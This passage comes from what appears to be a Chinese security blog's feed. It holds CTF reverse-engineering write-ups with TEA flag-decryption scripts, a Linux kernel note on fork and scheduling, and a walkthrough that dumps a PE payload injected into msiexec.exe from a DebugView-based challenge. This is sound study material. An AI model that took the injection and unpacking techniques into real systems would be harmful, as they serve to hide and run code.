class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>):<br>    ebx = (ebx + <span class="hljs-number">0x9E3779B9</span>) &amp; <span class="hljs-number">0xffffffff</span><br>    ecx = (f2 &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xffffffff</span><br>    ecx = (ecx + key1) &amp; <span class="hljs-number">0xffffffff</span><br>    ecx = (ecx ^ (f2 + ebx)) &amp; <span class="hljs-number">0xffffffff</span><br>    edx = f2 &gt;&gt; <span class="hljs-number">5</span><br>    edx = (edx + key2) &amp; <span class="hljs-number">0xffffffff</span><br>    ecx = ecx ^ edx<br>    f1 = (f1 + ecx) &amp; <span class="hljs-number">0xffffffff</span><br><br>    ecx = (f1 &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xffffffff</span><br>    ecx = (ecx + key3) &amp; <span class="hljs-number">0xffffffff</span><br>    ecx = (ecx ^ (f1 + ebx)) &amp; <span class="hljs-number">0xffffffff</span><br>    edx = f1 &gt;&gt; <span class="hljs-number">5</span><br>    edx = (edx + key4) &amp; <span class="hljs-number">0xffffffff</span><br>    ecx = ecx ^ edx<br>    f2 = (f2 + ecx) &amp; <span class="hljs-number">0xffffffff</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(f1), <span class="hljs-built_in">hex</span>(f2))<br><span class="hljs-comment"># 第一轮</span><br>k1 = <span class="hljs-number">0xA42D6EBF</span><br>k2 = <span class="hljs-number">0x0EFE89E7</span><br><span class="hljs-comment"># 第二轮</span><br><span class="hljs-comment"># k1 = 0xAADD934D</span><br><span class="hljs-comment"># k2 = 0x4E4E7F13</span><br><span class="hljs-comment"># 第三轮</span><br><span class="hljs-comment"># k1 = 0x8EC32CA9</span><br><span class="hljs-comment"># k2 = 0x8559D4E9</span><br><br></code></pre></td></tr></table></figure><p>实际上就是tea加密，这里用到的密钥就是在enc1、enc2、enc3里面被改的4个dword</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># enc1</span><br>key1 = <span class="hljs-number">0x466C7578</span><br>key2 = <span class="hljs-number">0x78756C46</span><br>key3 = <span class="hljs-number">0x78756C46</span><br>key4 = <span class="hljs-number">0x466C7578</span><br><br>key1 ^= <span class="hljs-number">0x6861636B</span><br>key2 ^= <span class="hljs-number">0x6B636168</span><br>key3 ^= <span class="hljs-number">0x6B636168</span><br>key4 ^= <span class="hljs-number">0x6861636B</span><br><br><span class="hljs-comment">#enc2</span><br>key1 ^= <span class="hljs-number">0xffffffff</span><br>key2 ^= <span class="hljs-number">0xffffffff</span><br>key3 ^= <span class="hljs-number">0xffffffff</span><br>key4 ^= <span class="hljs-number">0xffffffff</span><br><br>key1 ^= <span class="hljs-number">0x1010101</span><br>key2 ^= <span class="hljs-number">0x1010101</span><br>key3 ^= <span class="hljs-number">0x1010101</span><br>key4 ^= <span class="hljs-number">0x1010101</span><br><br><span class="hljs-comment">#enc3</span><br>key1 ^= <span class="hljs-number">0x10101010</span><br>key2 ^= <span class="hljs-number">0x10101010</span><br>key3 ^= <span class="hljs-number">0x10101010</span><br>key4 ^= <span class="hljs-number">0x10101010</span><br><br>key1 ^= <span class="hljs-number">0x2020202</span><br>key2 ^= <span class="hljs-number">0x2020202</span><br>key3 ^= <span class="hljs-number">0x2020202</span><br>key4 ^= <span class="hljs-number">0x2020202</span><br><br></code></pre></td></tr></table></figure><p>tea解密得到最后一段flag <code>nt_of_your_t00l_sh3d...&#125;</code></p><p><img src="assets/2023-11-28-13-06-26-image.png"></p><p>这道题比较有意思的地方在与用clone创建子进程设置进程的栈，通过ROP链来检测flag，最后通过共享内存的方式使主进程能够打印完整flag，还有就是ptrace的反调试，容易误认为其只会进入一个分支执行，但实际两个分支全部执行才能得到完整的key</p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux进程与调度</title>
    <link href="/2023/11/27/linux/Linux%E8%BF%9B%E7%A8%8B%E4%B8%8E%E8%B0%83%E5%BA%A6/"/>
    <url>/2023/11/27/linux/Linux%E8%BF%9B%E7%A8%8B%E4%B8%8E%E8%B0%83%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>fork实际调用clone实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// linux/kernel/fork.c</span><br>SYSCALL_DEFINE0(fork)<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_clone_args</span> <span class="hljs-title">args</span> =</span> &#123;<br>        .exit_signal = SIGCHLD,<br>    &#125;;<br>    <span class="hljs-keyword">return</span> kernel_clone(&amp;args);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kernel-clone"><a href="#kernel-clone" class="headerlink" title="kernel_clone"></a>kernel_clone</h3><p>进程创建主要操作在<code>kernel_clone</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// linux/kernerl/fork.c:2866</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *  Ok, this is the main fork-routine.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * It copies the process, and if successful kick-starts</span><br><span class="hljs-comment"> * it and waits for it to finish using the VM if required.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * args-&gt;exit_signal is expected to be checked for sanity by the caller.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">kernel_clone</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kernel_clone_args *args)</span>;<br></code></pre></td></tr></table></figure><p>参数结构体<code>kernel_clone_args</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// linux/include/linux/sched/task.h:21</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_clone_args</span> &#123;</span><br>    u64 flags;<br>    <span class="hljs-type">int</span> __user *pidfd;<br>    <span class="hljs-type">int</span> __user *child_tid;<br>    <span class="hljs-type">int</span> __user *parent_tid;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">int</span> exit_signal;<br>    u32 kthread:<span class="hljs-number">1</span>;<br>    u32 io_thread:<span class="hljs-number">1</span>;<br>    u32 user_worker:<span class="hljs-number">1</span>;<br>    u32 no_files:<span class="hljs-number">1</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-built_in">stack</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tls;<br>    <span class="hljs-type">pid_t</span> *set_tid;<br>    <span class="hljs-comment">/* Number of elements in *set_tid */</span><br>    <span class="hljs-type">size_t</span> set_tid_size;<br>    <span class="hljs-type">int</span> cgroup;<br>    <span class="hljs-type">int</span> idle;<br>    <span class="hljs-type">int</span> (*fn)(<span class="hljs-type">void</span> *);<br>    <span class="hljs-type">void</span> *fn_arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cgroup</span> *<span class="hljs-title">cgrp</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">css_set</span> *<span class="hljs-title">cset</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>kernel_clone</code>复制当前进程，当前进程<code>current</code>trace新创建的进程，获取新创建的进程的pid，启动新创建的进程，返回pid</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">p = copy_process(<span class="hljs-literal">NULL</span>, trace, NUMA_NO_NODE, args);<br>add_latent_entropy();<br><br>trace_sched_process_fork(current, p);<br><br>pid = get_task_pid(p, PIDTYPE_PID);<br>nr = pid_vnr(pid);<br><br>wake_up_new_task(p);<br><br>put_pid(pid);<br><span class="hljs-keyword">return</span> nr;<br></code></pre></td></tr></table></figure><p>在<code>kernel_clone</code>return之前添加调试代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">put_pid(pid);<br><span class="hljs-keyword">if</span> (nr &gt; <span class="hljs-number">1000</span>)    <span class="hljs-comment">// pid &gt; 1000避免在系统启动阶段输出太多日志导致无法启动</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> current_nr = *(&amp;current-&gt;pid);<br>    printk(<span class="hljs-string">&quot;[noxke dbg] kernel_clone return value: %d; current pid : %d\n&quot;</span>, nr, current_nr);<br>&#125;<br><span class="hljs-keyword">return</span> nr;<br></code></pre></td></tr></table></figure><p><img src="assets/2023-11-27-19-49-24-image.png"></p><p>调试可以发现，主进程2060创建了子进程2061，<code>kernel_clone</code>函数返回值为fork得到的子进程的pid，但是子进程并没有发现从此处返回，并且不能解释子进程fork返回值为0</p><h3 id="子进程返回"><a href="#子进程返回" class="headerlink" title="子进程返回"></a>子进程返回</h3><p>分析<code>copy_process</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// linux/kernel/fork.c:2519 copy_process</span><br>    retval = copy_thread(p, args);<br><span class="hljs-comment">// linux/arch/x86/kernel/process.c:182 copy_thread</span><br>    frame-&gt;ret_addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ret_from_fork_asm;<br></code></pre></td></tr></table></figure><p>在copy_thread时调用了<code>ret_from_fork_asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nasm">/*linux/arch/x86/entry/entry_64.S:225*/<br>SYM_CODE_START(ret_from_fork_asm)<br>    /*<br>     * This is the start of the kernel stack; even through there&#x27;s a<br>     * register set at the top, the regset isn&#x27;t necessarily coherent<br>     * (consider kthreads) and one cannot unwind further.<br>     *<br>     * This ensures stack unwinds of kernel threads terminate in a known<br>     * good state.<br>     */<br>    UNWIND_HINT_END_OF_STACK<br>    ANNOTATE_NOENDBR // copy_thread<br>    CALL_DEPTH_ACCOUNT<br><br>    movq    %rax, %rdi        /* prev */<br>    movq    %rsp, %rsi        /* regs */<br>    movq    %rbx, %rdx        /* fn */<br>    movq    %r12, %rcx        /* fn_arg */<br>    call    ret_from_fork<br><br>    /*<br>     * Set the stack state to what is expected for the target function<br>     * -- at this point the register set should be a valid user set<br>     * and unwind should work normally.<br>     */<br>    UNWIND_HINT_REGS<br>    jmp    swapgs_restore_regs_and_return_to_usermode<br>SYM_CODE_END(ret_from_fork_asm)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// linux/arch/x86/kernel/process.c:140</span><br>__visible <span class="hljs-type">void</span> <span class="hljs-title function_">ret_from_fork</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *prev, <span class="hljs-keyword">struct</span> pt_regs *regs,</span><br><span class="hljs-params">                     <span class="hljs-type">int</span> (*fn)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *fn_arg)</span><br>&#123;<br>    schedule_tail(prev);<br><br>    <span class="hljs-comment">/* Is this a kernel thread? */</span><br>    <span class="hljs-keyword">if</span> (unlikely(fn)) &#123;<br>        fn(fn_arg);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * A kernel thread is allowed to return here after successfully</span><br><span class="hljs-comment">         * calling kernel_execve().  Exit to userspace to complete the</span><br><span class="hljs-comment">         * execve() syscall.</span><br><span class="hljs-comment">         */</span><br>        regs-&gt;ax = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    syscall_exit_to_user_mode(regs);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终调用了<code>ret_from_fork</code>，修改了子进程的ax寄存器为0，以及使子进程由系统调用返回，因此子进程wake_up之后的返回值为0，并且和主进程返回位置不同</p><p>使用printk调试进程创建过程</p><p><img src="assets/2023-11-28-16-51-39-image.png"></p><h2 id="任务调度"><a href="#任务调度" class="headerlink" title="任务调度"></a>任务调度</h2><p>任务调度代码位于<code>linux/kernel/sched/</code>中，主调度器为<code>__schedule</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// linux/kernel/sched/core.c:6568</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __sched notrace __schedule(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sched_mode);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// linux/kernel/sched/core.c:6568 __schedule</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">prev</span>, *<span class="hljs-title">next</span>;</span><br><br><span class="hljs-comment">// 获取当前任务</span><br>cpu = smp_processor_id();<br>rq = cpu_rq(cpu);<br>prev = rq-&gt;curr;<br><span class="hljs-comment">// 获取当前任务的切换次数</span><br>switch_count = &amp;prev-&gt;nivcsw;<br><span class="hljs-comment">// 挂起当前任务</span><br>deactivate_task(rq, prev, DEQUEUE_SLEEP | DEQUEUE_NOCLOCK);<br>switch_count = &amp;prev-&gt;nvcsw;<br><br><span class="hljs-comment">// 获取下一个任务</span><br>next = pick_next_task(rq, prev, &amp;rf);<br>clear_tsk_need_resched(prev);<br><br><br><span class="hljs-keyword">if</span> (likely(prev != next)) &#123;<br>    rq-&gt;nr_switches++;<br>    RCU_INIT_POINTER(rq-&gt;curr, next);<br>    <span class="hljs-comment">// 上一个人物的切换次数+1</span><br>    ++*switch_count;<br>    migrate_disable_switch(rq, prev);<br>    psi_sched_switch(prev, next, !task_on_rq_queued(prev));<br><br>    trace_sched_switch(sched_mode &amp; SM_MASK_PREEMPT, prev, next, prev_state);<br>    <span class="hljs-comment">// 切换到新的任务</span><br>    rq = context_switch(rq, prev, next, &amp;rf);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>津门杯RE_Inject_and_ClimbToTop</title>
    <link href="/2023/11/18/ctf_wp/%E6%B4%A5%E9%97%A8%E6%9D%AFRE-Inject-and-ClimbToTop/"/>
    <url>/2023/11/18/ctf_wp/%E6%B4%A5%E9%97%A8%E6%9D%AFRE-Inject-and-ClimbToTop/</url>
    
    <content type="html"><![CDATA[<h2 id="Inject"><a href="#Inject" class="headerlink" title="Inject"></a>Inject</h2><p>DebugView的版本是<code>0.76</code>，下载一个相同版本的做bindiff</p><p><img src="assets/2023-11-19-00-00-17-image.png"></p><p>发现<code>sub_40F8B0</code>相似度不是1</p><p><img src="assets/2023-11-19-00-06-28-image.png"></p><p><img src="assets/2023-11-19-00-07-12-image.png"></p><p>修改了<code>0x487000</code>开头的4个字节，然后跳过去</p><p>根据这个函数的字符串信息大概能确定这个函数跟dump功能有关，下个断点在这</p><p><img src="assets/2023-11-19-00-09-32-image.png"></p><p>选择完文件后确实是断在了上面的地方，为了方便调试直接从入口点跳过去</p><p><img src="assets/2023-11-19-00-14-24-image.png"></p><p>进入到eax地址处</p><p><img src="assets/2023-11-19-00-11-53-image.png"></p><p>在easyre节区里，跟踪下去</p><p><img src="assets/2023-11-19-00-15-29-image.png"></p><p><img src="assets/2023-11-19-00-15-55-image.png"></p><p><img src="assets/2023-11-19-00-16-15-image.png"></p><p><img src="assets/2023-11-19-00-16-44-image.png"></p><p>call之间跳过，到jmp里面去</p><p><img src="assets/2023-11-19-00-17-41-image.png"></p><p>发现这个，很像是主函数的入口</p><p><img src="assets/2023-11-19-00-20-00-image.png"></p><p><img src="assets/2023-11-19-00-20-38-image.png"></p><p>非常的main函数，猜测应该是解密了一个PE文件手动加载到内存里运行</p><p>重新调一遍上面的过程</p><p><img src="assets/2023-11-19-00-26-36-image.png"></p><p>alloc了一块内存，关注一下这块内存</p><p><img src="assets/2023-11-19-00-28-58-image.png"></p><p>多了个PE文件头，大小这样0x400</p><p><img src="assets/2023-11-19-00-31-47-image.png"></p><p>实际上是memcpy了一下，源地址处感觉是更完整的PE文件，dump下来，大小根据上下文能得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> fp, begin, size, end, dexbyte;<br>fp = fopen(<span class="hljs-string">&quot;dump1.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>begin = <span class="hljs-number">0x02E70E48</span>;<br>size = <span class="hljs-number">0x3e1d8</span>;<br>end = begin + size;<br><span class="hljs-keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )<br>    fputc(Byte(dexbyte), fp);<br></code></pre></td></tr></table></figure><p><img src="assets/2023-11-19-00-37-09-image.png"></p><p>创建了一个<code>msiexec.exe</code>进程，然后注入</p><p>运行上面dump下来的文件，在<code>ResumeThread</code>之前附加到<code>msiexec.exe</code>上，在注入的代码下断点</p><p><img src="assets/2023-11-19-00-51-08-image.png"></p><p>然后恢复线程运行，调一下注入的代码，发现跟第一次的过程很相似</p><p><img src="assets/2023-11-19-00-52-39-image.png"></p><p><img src="assets/2023-11-19-00-54-53-image.png"></p><p><img src="assets/2023-11-19-00-55-44-image.png"></p><p>到上面的地方看ebp内存，一样的是PE文件，dump下来</p><p><img src="assets/2023-11-19-00-56-33-image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> fp, begin, size, end, dexbyte;<br>fp = fopen(<span class="hljs-string">&quot;dump2.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>begin = <span class="hljs-number">0x120E48</span>;<br>size = <span class="hljs-number">0x28000</span>;<br>end = begin + size;<br><span class="hljs-keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )<br>    fputc(Byte(dexbyte), fp);<br></code></pre></td></tr></table></figure><p>直接就能分析主函数了</p><p><img src="assets/2023-11-19-00-59-37-image.png"></p><p>打开flag文件读取flag，然后进行一些处理再比较，逆向算法得到flag</p><p>第一部分会做字符变换，直接patch一下代码把a~z的变化跑出来之后查表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">mp = [<span class="hljs-number">0x43</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7f</span>]<br><br>ls = [<span class="hljs-number">0x5B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x63</span>]<br>flag1 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> ls:<br>    i = mp.index(d)<br>    flag1 += <span class="hljs-built_in">chr</span>(i+<span class="hljs-number">0x61</span>)<br><br><br><span class="hljs-comment"># (flag2 * 0x89442161) &gt;&gt; 0x2c == 0x18E82</span><br>flag2 = (<span class="hljs-number">0x18E82</span> &lt;&lt; <span class="hljs-number">0x2c</span>) // <span class="hljs-number">0x89442161</span><br>flag2 += <span class="hljs-number">1</span><br>flag2 = flag2.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>).decode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>():<br>    <span class="hljs-comment"># tmp = flag2 + 0x6FC4108B</span><br>    tmp = (<span class="hljs-number">0x2e73692e</span> + <span class="hljs-number">0x6FC4108B</span>) &amp; <span class="hljs-number">0xffffffff</span><br>    flag3 = <span class="hljs-number">0x34333231</span><br>    flag4 = <span class="hljs-number">0x38373635</span><br>    edx = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>):<br>        edx = (edx + tmp) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(edx))<br>        ecx = ((flag4 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">0x69736d7b</span>) &amp; <span class="hljs-number">0xffffffff</span> <span class="hljs-comment"># &#123;msi</span><br>        eax = ((flag4 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x67616c66</span>) &amp; <span class="hljs-number">0xffffffff</span> <span class="hljs-comment"># flag</span><br>        ecx = ecx ^ eax ^ (edx + flag4) &amp; <span class="hljs-number">0xffffffff</span><br><br>        flag3 = (flag3 + ecx) &amp; <span class="hljs-number">0xffffffff</span><br>        ecx = ((flag3 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x63657865</span>) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># exec</span><br>        eax = ((flag3 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">0x2e73692e</span>) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># .is.</span><br>        ecx = ecx ^ eax ^ (edx + flag3) &amp; <span class="hljs-number">0xffffffff</span><br>        flag4 = (flag4 + ecx) &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag3), <span class="hljs-built_in">hex</span>(flag4))<br><br><span class="hljs-comment"># enc()</span><br><br>tmp = <span class="hljs-number">0x9e3779b9</span><br>edx = <span class="hljs-number">0x6526b0d9</span><br>flag3 = <span class="hljs-number">0x0C0CEE32</span><br>flag4 = <span class="hljs-number">0xB7F3D728</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>):<br>    edx = (edx - tmp) &amp; <span class="hljs-number">0xffffffff</span><br>    <br>    ecx = ((flag3 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x63657865</span>) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># exec</span><br>    eax = ((flag3 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">0x2e73692e</span>) &amp; <span class="hljs-number">0xffffffff</span>  <span class="hljs-comment"># .is.</span><br>    ecx = ecx ^ eax ^ (edx + flag3) &amp; <span class="hljs-number">0xffffffff</span><br>    flag4 = (flag4 - ecx) &amp; <span class="hljs-number">0xffffffff</span><br>    <br>    ecx = ((flag4 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">0x69736d7b</span>) &amp; <span class="hljs-number">0xffffffff</span> <span class="hljs-comment"># &#123;msi</span><br>    eax = ((flag4 &lt;&lt; <span class="hljs-number">4</span>) + <span 